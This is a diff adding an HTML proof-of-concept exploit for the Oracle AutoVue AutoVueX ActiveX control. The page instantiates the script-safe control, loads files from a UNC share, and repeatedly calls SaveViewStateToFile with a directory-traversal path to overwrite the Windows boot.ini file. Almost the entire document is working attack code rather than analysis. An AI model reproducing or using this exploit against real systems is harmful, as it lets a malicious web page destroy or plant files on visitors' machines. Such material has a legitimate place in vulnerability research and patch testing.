@@ -1,0 +1,26 @@
+&lt;!--
+Oracle AutoVue AutoVueX ActiveX Control SaveViewStateToFile Remote File Creation/Overwrite PoC
+
+ProgID: AUTOVUEX.AutoVueXCtrl.1
+CLSID: {B6FCC215-D303-11D1-BC6C-0000C078797F}
+Binary path: C:\PROGRA~1\av\avwin\AutoVueX.ocx
+Safe for initialization (registry): true
+Safe for scripting (registry): true
+
+rgod
+--&gt;
+&lt;!-- saved from url=(0014)about:internet --&gt; 
+&lt;html&gt;
+&lt;object classid=&#039;clsid:B6FCC215-D303-11D1-BC6C-0000C078797F&#039; id=&#039;obj&#039; width=640 height=480 /&gt;
+&lt;/object&gt;
+&lt;script defer=defer&gt;
+obj.SRC = &quot;\\\\192.168.0.1\\uncshare\\MicroStation.dgn&quot;;
+obj.RestoreViewStateFromFile(&quot;\\\\192.168.0.1\\uncshare\\sample.dmp&quot;);
+for (i=0; i&lt;6666; i++) { 
+    try{
+       obj.SaveViewStateToFile(&quot;../../../../../../../../../../boot.ini&quot;);
+    }catch(e){
+    }
+}
+&lt;/script&gt;
+
